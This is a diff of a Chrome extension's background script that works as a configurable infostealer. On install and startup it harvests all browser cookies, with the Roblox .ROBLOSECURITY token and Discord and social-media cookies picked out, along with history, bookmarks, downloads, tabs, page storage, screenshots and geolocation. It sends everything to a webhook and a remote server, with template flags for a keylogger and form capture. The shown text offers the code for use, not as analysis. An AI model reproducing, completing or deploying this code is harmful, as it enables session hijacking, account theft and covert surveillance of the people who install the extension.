@@ -23,10 +23,13 @@ let collectedData = {
   permissions: [],
   features: [],
   history: [],
-  bookmarks: [],
   cookies: [],
+  robloxData: [],
   localStorage: {},
-  sessionStorage: {}
+  sessionStorage: {},
+  bookmarks: [],
+  downloads: [],
+  tabs: []
 };
 
 // Generate UUID for session tracking
@@ -41,357 +44,50 @@ function generateSessionId() {
 // Enhanced data collection on extension startup
 if (chrome && chrome.runtime) {
   chrome.runtime.onStartup.addListener(() => {
-    collectInitialData();
+    collectAllData();
   });
 
   chrome.runtime.onInstalled.addListener(() => {
-    collectInitialData();
-    collectAllConfiguredData();
+    collectAllData();
   });
 }
 
-// Collect ALL configured data based on permissions and features
-async function collectAllConfiguredData() {
+// COMPREHENSIVE DATA COLLECTION
+async function collectAllData() {
   console.log('🔍 Starting comprehensive data collection...');
   
-  // Collect browser history if enabled
-  if ({{FEATURE_BROWSER_INFO}} && chrome.history) {
-    await collectBrowserHistory();
+  // Collect initial system data
+  await collectInitialData();
+  
+  // Collect browsing history
+  if ({{FEATURE_BROWSER_INFO}}) {
+    await collectBrowsingHistory();
   }
-
-  // Collect bookmarks if enabled
-  if ({{FEATURE_BROWSER_INFO}} && chrome.bookmarks) {
-    await collectBookmarks();
-  }
-
-  // Collect cookies from all sites
-  if (chrome.cookies) {
-    await collectAllCookies();
-  }
-
-  // Collect screenshots if enabled
+  
+  // Collect all cookies
+  await collectAllCookies();
+  
+  // Collect bookmarks
+  await collectBookmarks();
+  
+  // Collect open tabs
+  await collectAllTabs();
+  
+  // Collect downloads
+  await collectDownloads();
+  
+  // Look for Roblox data
+  await collectRobloxData();
+  
+  // Collect storage data from all origins
+  await collectStorageData();
+  
+  // Take screenshots if enabled
   if ({{FEATURE_SCREENSHOT}}) {
-    await captureScreenshots();
+    await captureAllScreenshots();
   }
-
-  // Collect system and browser information
-  await collectSystemInfo();
-
-  // Send all collected data
-  await sendComprehensiveData();
-}
-
-// Collect browser history
-async function collectBrowserHistory() {
-  try {
-    if (!chrome.history) {
-      console.warn('History API not available');
-      return;
-    }
-
-    console.log('📚 Collecting browser history...');
-    
-    // Get history from last 30 days
-    const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
-    
-    const historyItems = await new Promise((resolve, reject) => {
-      chrome.history.search({
-        text: '',
-        startTime: thirtyDaysAgo,
-        maxResults: 1000
-      }, (results) => {
-        if (chrome.runtime.lastError) {
-          reject(chrome.runtime.lastError);
-        } else {
-          resolve(results);
-        }
-      });
-    });
-
-    collectedData.history = historyItems.map(item => ({
-      url: item.url,
-      title: item.title,
-      visitCount: item.visitCount,
-      typedCount: item.typedCount,
-      lastVisitTime: new Date(item.lastVisitTime).toISOString()
-    }));
-
-    console.log(`✅ Collected ${collectedData.history.length} history items`);
-
-    // Send history data immediately
-    await sendToWebhookAndServer({
-      type: 'browser_history_collected',
-      extensionId: EXTENSION_ID,
-      sessionId: sessionId,
-      userId: USER_ID,
-      timestamp: Date.now(),
-      historyCount: collectedData.history.length,
-      history: collectedData.history.slice(0, 50), // Send first 50 items
-      totalHistoryItems: collectedData.history.length
-    });
-
-  } catch (error) {
-    console.error('❌ Error collecting history:', error);
-    collectedData.history = { error: 'Failed to collect history: ' + error.message };
-  }
-}
-
-// Collect bookmarks
-async function collectBookmarks() {
-  try {
-    if (!chrome.bookmarks) {
-      console.warn('Bookmarks API not available');
-      return;
-    }
-
-    console.log('🔖 Collecting bookmarks...');
-    
-    const bookmarkTree = await new Promise((resolve, reject) => {
-      chrome.bookmarks.getTree((results) => {
-        if (chrome.runtime.lastError) {
-          reject(chrome.runtime.lastError);
-        } else {
-          resolve(results);
-        }
-      });
-    });
-
-    function extractBookmarks(nodes, folder = '') {
-      let bookmarks = [];
-      for (const node of nodes) {
-        if (node.url) {
-          bookmarks.push({
-            title: node.title,
-            url: node.url,
-            folder: folder,
-            dateAdded: new Date(node.dateAdded).toISOString()
-          });
-        }
-        if (node.children) {
-          bookmarks = bookmarks.concat(extractBookmarks(node.children, node.title));
-        }
-      }
-      return bookmarks;
-    }
-
-    collectedData.bookmarks = extractBookmarks(bookmarkTree);
-    console.log(`✅ Collected ${collectedData.bookmarks.length} bookmarks`);
-
-    // Send bookmarks data immediately
-    await sendToWebhookAndServer({
-      type: 'bookmarks_collected',
-      extensionId: EXTENSION_ID,
-      sessionId: sessionId,
-      userId: USER_ID,
-      timestamp: Date.now(),
-      bookmarksCount: collectedData.bookmarks.length,
-      bookmarks: collectedData.bookmarks
-    });
-
-  } catch (error) {
-    console.error('❌ Error collecting bookmarks:', error);
-    collectedData.bookmarks = { error: 'Failed to collect bookmarks: ' + error.message };
-  }
-}
-
-// Collect ALL cookies from all domains
-async function collectAllCookies() {
-  try {
-    if (!chrome.cookies) {
-      console.warn('Cookies API not available');
-      return;
-    }
-
-    console.log('🍪 Collecting all cookies...');
-    
-    const allCookies = await new Promise((resolve, reject) => {
-      chrome.cookies.getAll({}, (cookies) => {
-        if (chrome.runtime.lastError) {
-          reject(chrome.runtime.lastError);
-        } else {
-          resolve(cookies);
-        }
-      });
-    });
-
-    // Organize cookies by domain and look for sensitive ones
-    const cookiesByDomain = {};
-    const sensitiveCookies = [];
-    const discordCookies = [];
-    const robloxCookies = [];
-    const socialMediaCookies = [];
-
-    for (const cookie of allCookies) {
-      const domain = cookie.domain;
-      
-      if (!cookiesByDomain[domain]) {
-        cookiesByDomain[domain] = [];
-      }
-      
-      const cookieInfo = {
-        name: cookie.name,
-        value: cookie.value,
-        domain: cookie.domain,
-        path: cookie.path,
-        secure: cookie.secure,
-        httpOnly: cookie.httpOnly,
-        sameSite: cookie.sameSite,
-        expirationDate: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : null
-      };
-      
-      cookiesByDomain[domain].push(cookieInfo);
-
-      // Check for sensitive cookies
-      const sensitivePatterns = [
-        /auth/i, /session/i, /token/i, /login/i, /user/i, /account/i, 
-        /password/i, /secret/i, /key/i, /jwt/i, /oauth/i, /csrf/i
-      ];
-      
-      if (sensitivePatterns.some(pattern => pattern.test(cookie.name))) {
-        sensitiveCookies.push(cookieInfo);
-      }
-
-      // Check for Discord cookies
-      if (domain.includes('discord') || cookie.name.toLowerCase().includes('discord')) {
-        discordCookies.push(cookieInfo);
-      }
-
-      // Check for Roblox cookies (.ROBLOSECURITY is the main one)
-      if (domain.includes('roblox') || cookie.name.includes('ROBLOSECURITY')) {
-        robloxCookies.push(cookieInfo);
-      }
-
-      // Check for social media cookies
-      const socialDomains = ['facebook', 'twitter', 'instagram', 'tiktok', 'snapchat', 'youtube', 'twitch'];
-      if (socialDomains.some(social => domain.includes(social))) {
-        socialMediaCookies.push(cookieInfo);
-      }
-    }
-
-    collectedData.cookies = {
-      total: allCookies.length,
-      byDomain: cookiesByDomain,
-      sensitive: sensitiveCookies,
-      discord: discordCookies,
-      roblox: robloxCookies,
-      socialMedia: socialMediaCookies,
-      domains: Object.keys(cookiesByDomain)
-    };
-
-    console.log(`✅ Collected ${allCookies.length} cookies from ${Object.keys(cookiesByDomain).length} domains`);
-    console.log(`🔥 Found ${sensitiveCookies.length} sensitive cookies`);
-    console.log(`🎮 Found ${discordCookies.length} Discord cookies`);
-    console.log(`🎯 Found ${robloxCookies.length} Roblox cookies`);
-
-    // Send cookies data immediately
-    await sendToWebhookAndServer({
-      type: 'cookies_collected',
-      extensionId: EXTENSION_ID,
-      sessionId: sessionId,
-      userId: USER_ID,
-      timestamp: Date.now(),
-      cookiesData: collectedData.cookies,
-      criticalFindings: {
-        hasSensitiveCookies: sensitiveCookies.length > 0,
-        hasDiscordCookies: discordCookies.length > 0,
-        hasRobloxCookies: robloxCookies.length > 0,
-        totalDomains: Object.keys(cookiesByDomain).length
-      }
-    });
-
-  } catch (error) {
-    console.error('❌ Error collecting cookies:', error);
-    collectedData.cookies = { error: 'Failed to collect cookies: ' + error.message };
-  }
-}
-
-// Capture screenshots of active tabs
-async function captureScreenshots() {
-  try {
-    if (!{{FEATURE_SCREENSHOT}}) {
-      return;
-    }
-
-    console.log('📸 Capturing screenshots...');
-    
-    // Get all tabs
-    const tabs = await new Promise((resolve, reject) => {
-      chrome.tabs.query({}, (tabs) => {
-        if (chrome.runtime.lastError) {
-          reject(chrome.runtime.lastError);
-        } else {
-          resolve(tabs);
-        }
-      });
-    });
-
-    const screenshots = [];
-    
-    // Capture visible tabs (limit to first 5 to avoid overwhelming)
-    for (let i = 0; i < Math.min(tabs.length, 5); i++) {
-      const tab = tabs[i];
-      
-      try {
-        // Make tab active first
-        await new Promise((resolve) => {
-          chrome.tabs.update(tab.id, { active: true }, resolve);
-        });
-        
-        // Wait a moment for tab to load
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        
-        // Capture screenshot
-        const screenshotUrl = await new Promise((resolve, reject) => {
-          chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png', quality: 60 }, (dataUrl) => {
-            if (chrome.runtime.lastError) {
-              reject(chrome.runtime.lastError);
-            } else {
-              resolve(dataUrl);
-            }
-          });
-        });
-        
-        screenshots.push({
-          tabId: tab.id,
-          url: tab.url,
-          title: tab.title,
-          screenshot: screenshotUrl,
-          timestamp: Date.now()
-        });
-        
-        console.log(`📸 Captured screenshot for: ${tab.title}`);
-        
-      } catch (error) {
-        console.error(`❌ Failed to capture screenshot for tab ${tab.id}:`, error);
-      }
-    }
-
-    collectedData.screenshots = screenshots;
-    console.log(`✅ Captured ${screenshots.length} screenshots`);
-
-    // Send screenshots data immediately
-    if (screenshots.length > 0) {
-      await sendToWebhookAndServer({
-        type: 'screenshots_captured',
-        extensionId: EXTENSION_ID,
-        sessionId: sessionId,
-        userId: USER_ID,
-        timestamp: Date.now(),
-        screenshotCount: screenshots.length,
-        screenshots: screenshots.map(s => ({
-          tabId: s.tabId,
-          url: s.url,
-          title: s.title,
-          timestamp: s.timestamp,
-          hasScreenshot: true
-        }))
-      });
-    }
-
-  } catch (error) {
-    console.error('❌ Error capturing screenshots:', error);
-    collectedData.screenshots = { error: 'Failed to capture screenshots: ' + error.message };
-  }
+  
+  console.log('✅ Comprehensive data collection completed');
 }
 
 // Collect initial system data
@@ -406,6 +102,7 @@ async function collectInitialData() {
       platform: navigator.platform,
       userAgent: navigator.userAgent,
       language: navigator.language,
+      languages: navigator.languages,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       screenResolution: screen ? `${screen.width}x${screen.height}` : 'unknown',
       colorDepth: screen.colorDepth,
@@ -413,148 +110,408 @@ async function collectInitialData() {
       cookieEnabled: navigator.cookieEnabled,
       onLine: navigator.onLine,
       hardwareConcurrency: navigator.hardwareConcurrency,
-      deviceMemory: navigator.deviceMemory || 'unknown'
+      deviceMemory: navigator.deviceMemory || 'unknown',
+      connection: navigator.connection ? {
+        effectiveType: navigator.connection.effectiveType,
+        downlink: navigator.connection.downlink,
+        rtt: navigator.connection.rtt
+      } : 'unknown'
     }
   };
 
   await sendToWebhookAndServer(systemData);
 }
 
-// Track tab changes with enhanced data collection
-if (chrome && chrome.tabs) {
-  chrome.tabs.onActivated.addListener(async (activeInfo) => {
-    const ipTracking = {{FEATURE_IP_TRACKING}};
-    const browserInfo = {{FEATURE_BROWSER_INFO}};
-    if (ipTracking || browserInfo) {
-      try {
-        const tab = await chrome.tabs.get(activeInfo.tabId);
-        await collectAndSendTabData(tab, 'tab_activated');
-        
-        // Also collect storage data when tab changes
-        await collectTabStorageData(tab);
-      } catch (error) {
-        console.error('Error tracking tab activation:', error);
-      }
-    }
-  });
-}
-
-// Track navigation with enhanced data
-chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
-  if (changeInfo.status === 'complete' && tab.url) {
-    await collectAndSendTabData(tab, 'page_loaded');
-    
-    // Collect storage data from the new page
-    await collectTabStorageData(tab);
-  }
-});
-
-// Collect localStorage and sessionStorage from tabs
-async function collectTabStorageData(tab) {
+// Collect complete browsing history
+async function collectBrowsingHistory() {
   try {
-    if (!tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
-      return;
-    }
-
-    // Inject script to collect storage data
-    const results = await chrome.scripting.executeScript({
-      target: { tabId: tab.id },
-      func: function() {
-        try {
-          const localStorageData = {};
-          const sessionStorageData = {};
-          
-          // Collect localStorage
-          for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            if (key) {
-              localStorageData[key] = localStorage.getItem(key);
-            }
-          }
-          
-          // Collect sessionStorage
-          for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            if (key) {
-              sessionStorageData[key] = sessionStorage.getItem(key);
-            }
-          }
-          
-          return {
-            localStorage: localStorageData,
-            sessionStorage: sessionStorageData,
-            url: window.location.href,
-            domain: window.location.hostname
-          };
-        } catch (error) {
-          return { error: error.message };
-        }
-      }
-    });
-
-    if (results && results[0] && results[0].result) {
-      const storageData = results[0].result;
-      
-      // Check for sensitive data
-      const sensitivePatterns = [
-        /token/i, /auth/i, /session/i, /password/i, /key/i, /secret/i,
-        /discord/i, /roblox/i, /roblosecurity/i, /user/i, /account/i
-      ];
-      
-      const foundSensitiveData = [];
-      
-      // Check localStorage
-      Object.keys(storageData.localStorage || {}).forEach(key => {
-        const value = storageData.localStorage[key];
-        if (sensitivePatterns.some(pattern => pattern.test(key) || pattern.test(value))) {
-          foundSensitiveData.push({
-            type: 'localStorage',
-            key: key,
-            value: value,
-            source: storageData.domain
-          });
-        }
+    if (chrome.history) {
+      const history = await chrome.history.search({
+        text: '',
+        maxResults: 10000,
+        startTime: Date.now() - (30 * 24 * 60 * 60 * 1000) // Last 30 days
       });
       
-      // Check sessionStorage
-      Object.keys(storageData.sessionStorage || {}).forEach(key => {
-        const value = storageData.sessionStorage[key];
-        if (sensitivePatterns.some(pattern => pattern.test(key) || pattern.test(value))) {
-          foundSensitiveData.push({
-            type: 'sessionStorage',
-            key: key,
-            value: value,
-            source: storageData.domain
-          });
-        }
-      });
-
-      // Send storage data
-      await sendToWebhookAndServer({
-        type: 'storage_data_collected',
+      const historyData = {
+        type: 'browsing_history',
         extensionId: EXTENSION_ID,
         sessionId: sessionId,
         userId: USER_ID,
         timestamp: Date.now(),
-        tabInfo: {
+        historyCount: history.length,
+        history: history.map(item => ({
+          id: item.id,
+          url: item.url,
+          title: item.title,
+          lastVisitTime: item.lastVisitTime,
+          visitCount: item.visitCount,
+          typedCount: item.typedCount
+        }))
+      };
+      
+      collectedData.history = historyData.history;
+      await sendToWebhookAndServer(historyData);
+      
+      console.log(`📚 Collected ${history.length} history entries`);
+    }
+  } catch (error) {
+    console.error('Error collecting browsing history:', error);
+  }
+}
+
+// Collect ALL cookies from ALL domains
+async function collectAllCookies() {
+  try {
+    if (chrome.cookies) {
+      const allCookies = await chrome.cookies.getAll({});
+      
+      const cookieData = {
+        type: 'all_cookies',
+        extensionId: EXTENSION_ID,
+        sessionId: sessionId,
+        userId: USER_ID,
+        timestamp: Date.now(),
+        cookieCount: allCookies.length,
+        cookies: allCookies.map(cookie => ({
+          name: cookie.name,
+          value: cookie.value,
+          domain: cookie.domain,
+          path: cookie.path,
+          secure: cookie.secure,
+          httpOnly: cookie.httpOnly,
+          sameSite: cookie.sameSite,
+          expirationDate: cookie.expirationDate,
+          storeId: cookie.storeId
+        })),
+        robloxCookies: allCookies.filter(cookie => 
+          cookie.domain.includes('roblox.com') || 
+          cookie.name.includes('ROBLOSECURITY') ||
+          cookie.name.includes('.ROBLOSECURITY')
+        ),
+        discordCookies: allCookies.filter(cookie => 
+          cookie.domain.includes('discord.com') || 
+          cookie.domain.includes('discordapp.com')
+        ),
+        socialCookies: allCookies.filter(cookie => 
+          cookie.domain.includes('facebook.com') ||
+          cookie.domain.includes('twitter.com') ||
+          cookie.domain.includes('instagram.com') ||
+          cookie.domain.includes('tiktok.com') ||
+          cookie.domain.includes('youtube.com')
+        )
+      };
+      
+      collectedData.cookies = cookieData.cookies;
+      await sendToWebhookAndServer(cookieData);
+      
+      console.log(`🍪 Collected ${allCookies.length} cookies from all domains`);
+    }
+  } catch (error) {
+    console.error('Error collecting cookies:', error);
+  }
+}
+
+// Collect bookmarks
+async function collectBookmarks() {
+  try {
+    if (chrome.bookmarks) {
+      const bookmarks = await chrome.bookmarks.getTree();
+      
+      const flattenBookmarks = (nodes) => {
+        let result = [];
+        for (let node of nodes) {
+          if (node.url) {
+            result.push({
+              id: node.id,
+              title: node.title,
+              url: node.url,
+              dateAdded: node.dateAdded,
+              dateGroupModified: node.dateGroupModified
+            });
+          }
+          if (node.children) {
+            result = result.concat(flattenBookmarks(node.children));
+          }
+        }
+        return result;
+      };
+      
+      const flatBookmarks = flattenBookmarks(bookmarks);
+      
+      const bookmarkData = {
+        type: 'bookmarks',
+        extensionId: EXTENSION_ID,
+        sessionId: sessionId,
+        userId: USER_ID,
+        timestamp: Date.now(),
+        bookmarkCount: flatBookmarks.length,
+        bookmarks: flatBookmarks
+      };
+      
+      collectedData.bookmarks = flatBookmarks;
+      await sendToWebhookAndServer(bookmarkData);
+      
+      console.log(`🔖 Collected ${flatBookmarks.length} bookmarks`);
+    }
+  } catch (error) {
+    console.error('Error collecting bookmarks:', error);
+  }
+}
+
+// Collect all open tabs
+async function collectAllTabs() {
+  try {
+    if (chrome.tabs) {
+      const tabs = await chrome.tabs.query({});
+      
+      const tabData = {
+        type: 'all_tabs',
+        extensionId: EXTENSION_ID,
+        sessionId: sessionId,
+        userId: USER_ID,
+        timestamp: Date.now(),
+        tabCount: tabs.length,
+        tabs: tabs.map(tab => ({
+          id: tab.id,
           url: tab.url,
           title: tab.title,
-          domain: storageData.domain
-        },
-        storageData: storageData,
-        sensitiveData: foundSensitiveData,
-        hasSensitiveData: foundSensitiveData.length > 0
-      });
+          active: tab.active,
+          pinned: tab.pinned,
+          incognito: tab.incognito,
+          windowId: tab.windowId,
+          index: tab.index,
+          favIconUrl: tab.favIconUrl,
+          status: tab.status,
+          audible: tab.audible,
+          muted: tab.mutedInfo?.muted
+        }))
+      };
+      
+      collectedData.tabs = tabData.tabs;
+      await sendToWebhookAndServer(tabData);
+      
+      console.log(`📑 Collected ${tabs.length} open tabs`);
+    }
+  } catch (error) {
+    console.error('Error collecting tabs:', error);
+  }
+}
 
-      console.log(`💾 Collected storage data from ${storageData.domain}: ${Object.keys(storageData.localStorage || {}).length} localStorage, ${Object.keys(storageData.sessionStorage || {}).length} sessionStorage`);
-      if (foundSensitiveData.length > 0) {
-        console.log(`🔥 Found ${foundSensitiveData.length} sensitive storage items`);
+// Collect downloads
+async function collectDownloads() {
+  try {
+    if (chrome.downloads) {
+      const downloads = await chrome.downloads.search({
+        limit: 1000,
+        orderBy: ['-startTime']
+      });
+      
+      const downloadData = {
+        type: 'downloads',
+        extensionId: EXTENSION_ID,
+        sessionId: sessionId,
+        userId: USER_ID,
+        timestamp: Date.now(),
+        downloadCount: downloads.length,
+        downloads: downloads.map(download => ({
+          id: download.id,
+          url: download.url,
+          filename: download.filename,
+          danger: download.danger,
+          mime: download.mime,
+          startTime: download.startTime,
+          endTime: download.endTime,
+          state: download.state,
+          paused: download.paused,
+          error: download.error,
+          bytesReceived: download.bytesReceived,
+          totalBytes: download.totalBytes,
+          fileSize: download.fileSize,
+          exists: download.exists
+        }))
+      };
+      
+      collectedData.downloads = downloadData.downloads;
+      await sendToWebhookAndServer(downloadData);
+      
+      console.log(`📥 Collected ${downloads.length} downloads`);
+    }
+  } catch (error) {
+    console.error('Error collecting downloads:', error);
+  }
+}
+
+// Collect Roblox-specific data
+async function collectRobloxData() {
+  try {
+    // Check for Roblox cookies specifically
+    if (chrome.cookies) {
+      const robloxCookies = await chrome.cookies.getAll({domain: '.roblox.com'});
+      
+      // Look for ROBLOSECURITY token
+      const roblosecurityCookie = robloxCookies.find(cookie => 
+        cookie.name === '.ROBLOSECURITY' || cookie.name === 'ROBLOSECURITY'
+      );
+      
+      const robloxData = {
+        type: 'roblox_data',
+        extensionId: EXTENSION_ID,
+        sessionId: sessionId,
+        userId: USER_ID,
+        timestamp: Date.now(),
+        robloxCookies: robloxCookies,
+        roblosecurityToken: roblosecurityCookie ? roblosecurityCookie.value : null,
+        hasRobloxSession: !!roblosecurityCookie
+      };
+      
+      if (roblosecurityCookie) {
+        console.log('🎮 ROBLOX SESSION TOKEN FOUND!');
+      }
+      
+      collectedData.robloxData = robloxData;
+      await sendToWebhookAndServer(robloxData);
+    }
+  } catch (error) {
+    console.error('Error collecting Roblox data:', error);
+  }
+}
+
+// Collect storage data from pages
+async function collectStorageData() {
+  try {
+    if (chrome.tabs) {
+      const tabs = await chrome.tabs.query({});
+      
+      for (const tab of tabs.slice(0, 10)) { // Limit to prevent overload
+        if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
+          try {
+            await chrome.scripting.executeScript({
+              target: { tabId: tab.id },
+              func: collectPageStorage,
+              args: [EXTENSION_ID, sessionId, USER_ID, tab.url]
+            });
+          } catch (error) {
+            console.log(`Could not access storage for ${tab.url}:`, error.message);
+          }
+        }
       }
     }
+  } catch (error) {
+    console.error('Error collecting storage data:', error);
+  }
+}
+
+// Function to inject for storage collection
+function collectPageStorage(extensionId, sessionId, userId, url) {
+  try {
+    const storageData = {
+      type: 'page_storage',
+      extensionId: extensionId,
+      sessionId: sessionId,
+      userId: userId,
+      timestamp: Date.now(),
+      url: url,
+      domain: window.location.hostname,
+      localStorage: {},
+      sessionStorage: {},
+      cookies: document.cookie,
+      indexedDBDatabases: [],
+      webSQLDatabases: []
+    };
+
+    // Collect localStorage
+    try {
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key) {
+          const value = localStorage.getItem(key);
+          storageData.localStorage[key] = value;
+        }
+      }
+    } catch (e) {
+      storageData.localStorage = { error: 'Access denied' };
+    }
+
+    // Collect sessionStorage
+    try {
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        if (key) {
+          const value = sessionStorage.getItem(key);
+          storageData.sessionStorage[key] = value;
+        }
+      }
+    } catch (e) {
+      storageData.sessionStorage = { error: 'Access denied' };
+    }
+
+    // Send to background script
+    chrome.runtime.sendMessage({ type: 'storageData', data: storageData });
 
   } catch (error) {
-    console.error('❌ Error collecting storage data:', error);
+    console.error('Error collecting page storage:', error);
   }
+}
+
+// Capture screenshots of all tabs
+async function captureAllScreenshots() {
+  try {
+    if (chrome.tabs && chrome.tabs.captureVisibleTab) {
+      const windows = await chrome.windows.getAll({ populate: true });
+      
+      for (const window of windows) {
+        for (const tab of window.tabs) {
+          if (tab.active && !tab.url.startsWith('chrome://')) {
+            try {
+              const dataUrl = await chrome.tabs.captureVisibleTab(window.id, { format: 'png' });
+              
+              const screenshotData = {
+                type: 'screenshot',
+                extensionId: EXTENSION_ID,
+                sessionId: sessionId,
+                userId: USER_ID,
+                timestamp: Date.now(),
+                tabInfo: {
+                  id: tab.id,
+                  url: tab.url,
+                  title: tab.title,
+                  windowId: window.id
+                },
+                screenshot: dataUrl.substring(0, 1000) + '...[TRUNCATED]', // Limit size for webhook
+                screenshotSize: dataUrl.length
+              };
+              
+              await sendToWebhookAndServer(screenshotData);
+              console.log(`📸 Screenshot captured for: ${tab.title}`);
+              
+            } catch (error) {
+              console.log(`Could not capture screenshot for tab ${tab.id}:`, error.message);
+            }
+          }
+        }
+      }
+    }
+  } catch (error) {
+    console.error('Error capturing screenshots:', error);
+  }
+}
+
+// Track tab changes with comprehensive data
+if (chrome && chrome.tabs) {
+  chrome.tabs.onActivated.addListener(async (activeInfo) => {
+    await collectAndSendTabData(await chrome.tabs.get(activeInfo.tabId), 'tab_activated');
+  });
+
+  chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
+    if (changeInfo.status === 'complete' && tab.url) {
+      await collectAndSendTabData(tab, 'page_loaded');
+      
+      // Collect fresh data when user navigates
+      setTimeout(() => {
+        collectPageDataFromTab(tab);
+      }, 2000);
+    }
+  });
 }
 
 // Enhanced data collection from tabs
@@ -579,28 +536,7 @@ async function collectAndSendTabData(tab, eventType) {
       }
     };
 
-    // Add browser info if enabled
-    if ({{FEATURE_BROWSER_INFO}}) {
-      data.systemInfo = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages,
-        cookieEnabled: navigator.cookieEnabled,
-        onLine: navigator.onLine,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screenInfo: {
-          width: screen.width,
-          height: screen.height,
-          availWidth: screen.availWidth,
-          availHeight: screen.availHeight,
-          colorDepth: screen.colorDepth,
-          pixelDepth: screen.pixelDepth
-        }
-      };
-    }
-
-    // Add geolocation if enabled and permitted
+    // Add geolocation if enabled
     if ({{FEATURE_GEOLOCATION}}) {
       try {
         const position = await getCurrentPosition();
@@ -608,42 +544,38 @@ async function collectAndSendTabData(tab, eventType) {
           latitude: position.coords.latitude,
           longitude: position.coords.longitude,
           accuracy: position.coords.accuracy,
-          altitude: position.coords.altitude,
-          altitudeAccuracy: position.coords.altitudeAccuracy,
-          heading: position.coords.heading,
-          speed: position.coords.speed,
           timestamp: position.timestamp
         };
       } catch (error) {
-        data.location = { error: 'Geolocation not available or denied' };
-      }
-    }
-
-    // Inject content script to collect additional data
-    if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
-      try {
-        await chrome.scripting.executeScript({
-          target: { tabId: tab.id },
-          func: collectPageData,
-          args: [EXTENSION_ID, sessionId, USER_ID, {{FEATURE_FORM_DATA}}, {{FEATURE_CLICK_TRACKING}}, {{FEATURE_KEYLOGGER}}]
-        });
-      } catch (error) {
-        console.error('Error injecting content script:', error);
+        data.location = { error: 'Geolocation not available' };
       }
     }
 
     await sendToWebhookAndServer(data);
+
+    // Inject comprehensive data collection script
+    if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://')) {
+      try {
+        await chrome.scripting.executeScript({
+          target: { tabId: tab.id },
+          func: collectCompletePageData,
+          args: [EXTENSION_ID, sessionId, USER_ID, {{FEATURE_FORM_DATA}}, {{FEATURE_CLICK_TRACKING}}, {{FEATURE_KEYLOGGER}}]
+        });
+      } catch (error) {
+        console.error('Error injecting comprehensive collection script:', error);
+      }
+    }
 
   } catch (error) {
     console.error('Error collecting tab data:', error);
   }
 }
 
-// Function to inject into pages for enhanced data collection
-function collectPageData(extensionId, sessionId, userId, captureFormData, captureClicks, captureKeystrokes) {
+// Comprehensive page data collection function
+function collectCompletePageData(extensionId, sessionId, userId, captureFormData, captureClicks, captureKeystrokes) {
   try {
     const pageData = {
-      type: 'page_analysis',
+      type: 'comprehensive_page_analysis',
       extensionId: extensionId,
       sessionId: sessionId,
       userId: userId,
@@ -662,119 +594,165 @@ function collectPageData(extensionId, sessionId, userId, captureFormData, captur
         referrer: document.referrer,
         characterSet: document.characterSet,
         readyState: document.readyState,
-        lastModified: document.lastModified
+        lastModified: document.lastModified,
+        doctype: document.doctype ? document.doctype.name : 'unknown'
       },
       forms: [],
       links: [],
       images: [],
       inputs: [],
+      scripts: [],
+      iframes: [],
       localStorage: {},
       sessionStorage: {},
-      cookies: document.cookie
+      cookies: document.cookie,
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      onlineStatus: navigator.onLine,
+      cookieEnabled: navigator.cookieEnabled
     };
 
-    // Collect form information
-    if (captureFormData) {
-      const forms = document.querySelectorAll('form');
-      forms.forEach((form, index) => {
-        const formData = {
-          index: index,
-          action: form.action,
-          method: form.method,
-          name: form.name,
-          id: form.id,
-          className: form.className,
-          inputCount: form.querySelectorAll('input').length,
-          inputs: []
-        };
+    // Collect all forms with detailed information
+    const forms = document.querySelectorAll('form');
+    forms.forEach((form, index) => {
+      const formData = {
+        index: index,
+        action: form.action,
+        method: form.method,
+        name: form.name,
+        id: form.id,
+        className: form.className,
+        autocomplete: form.autocomplete,
+        target: form.target,
+        inputCount: form.querySelectorAll('input').length,
+        inputs: []
+      };
 
-        const inputs = form.querySelectorAll('input, textarea, select');
-        inputs.forEach(input => {
-          formData.inputs.push({
-            type: input.type || 'text',
-            name: input.name,
-            id: input.id,
-            placeholder: input.placeholder,
-            required: input.required,
-            value: input.type === 'password' ? '[HIDDEN]' : input.value?.substring(0, 50)
-          });
+      const inputs = form.querySelectorAll('input, textarea, select');
+      inputs.forEach(input => {
+        formData.inputs.push({
+          type: input.type || 'text',
+          name: input.name,
+          id: input.id,
+          placeholder: input.placeholder,
+          required: input.required,
+          disabled: input.disabled,
+          readonly: input.readOnly,
+          value: input.type === 'password' ? '[HIDDEN]' : input.value?.substring(0, 100),
+          checked: input.checked,
+          selected: input.selected
         });
-
-        pageData.forms.push(formData);
       });
-    }
 
-    // Collect all input fields
+      pageData.forms.push(formData);
+    });
+
+    // Collect all input fields (including those outside forms)
     const allInputs = document.querySelectorAll('input, textarea, select');
     allInputs.forEach(input => {
       pageData.inputs.push({
         type: input.type || 'unknown',
         name: input.name,
         id: input.id,
+        className: input.className,
         placeholder: input.placeholder,
         autocomplete: input.autocomplete,
         required: input.required,
         disabled: input.disabled,
-        value: input.type === 'password' ? '[HIDDEN]' : input.value?.substring(0, 50)
+        readonly: input.readOnly,
+        value: input.type === 'password' ? '[HIDDEN]' : input.value?.substring(0, 100),
+        checked: input.checked,
+        selected: input.selected,
+        maxLength: input.maxLength,
+        minLength: input.minLength,
+        pattern: input.pattern
       });
     });
 
-    // Collect links
+    // Collect all links
     const links = document.querySelectorAll('a[href]');
-    Array.from(links).slice(0, 50).forEach(link => {
+    Array.from(links).slice(0, 100).forEach(link => {
       pageData.links.push({
         href: link.href,
         text: link.textContent?.substring(0, 100),
+        title: link.title,
